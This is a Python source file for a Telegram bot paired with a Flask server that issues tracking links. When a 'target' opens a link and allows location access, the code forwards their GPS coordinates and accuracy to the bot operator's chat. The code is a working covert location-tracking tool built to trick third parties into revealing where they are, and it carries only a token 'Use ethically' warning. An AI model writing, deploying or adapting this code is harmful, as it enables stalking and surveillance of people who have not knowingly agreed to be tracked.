import os
import secrets
from threading import Thread
from flask import Flask, render_template, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CAPTURE_BASE_URL = os.environ.get("CAPTURE_BASE_URL", "https://your-app.onrender.com")

active_links = {}  # {token: user_id}

# ========== FLASK APP ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Location Tracker Bot is running."

@flask_app.route('/<token>')
def capture_page(token):
    return render_template('index.html', token=token)

@flask_app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    token = data.get('token')
    if token not in active_links:
        return jsonify({"error": "Invalid token"}), 403
    
    user_id = active_links[token]
    lat = data.get('lat')
    lon = data.get('lon')
    accuracy = data.get('accuracy', 'N/A')
    
    # Send location via bot (we need bot instance)
    # Since Flask and bot run together, we use global variable
    global bot_app
    if bot_app and lat and lon:
        bot_app.bot.send_location(chat_id=user_id, latitude=lat, longitude=lon)
        bot_app.bot.send_message(chat_id=user_id, text=f"📍 Live location update:\nLat: {lat}\nLon: {lon}\nAccuracy: ±{accuracy}m")
    
    return jsonify({"status": "ok"}), 200

# ========== TELEGRAM BOT ==========
bot_app = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = secrets.token_hex(16)
    active_links[token] = update.effective_user.id
    link = f"{CAPTURE_BASE_URL}/{token}"
    keyboard = [[InlineKeyboardButton("🔗 Send Tracking Link", url=link)]]
    await update.message.reply_text(
        f"✅ **Your location tracking link:**\n`{link}`\n\n"
        "When the target opens it and allows location, you will receive live GPS updates.\n\n⚠️ *Use ethically*",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def run_flask():
    flask_app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

def main():
    global bot_app
    # Start Flask in background
    Thread(target=run_flask, daemon=True).start()
    
    # Start Telegram bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    bot_app = application
    print("Bot started. Use /start to generate tracking link.")
    application.run_polling()

if __name__ == "__main__":
    main()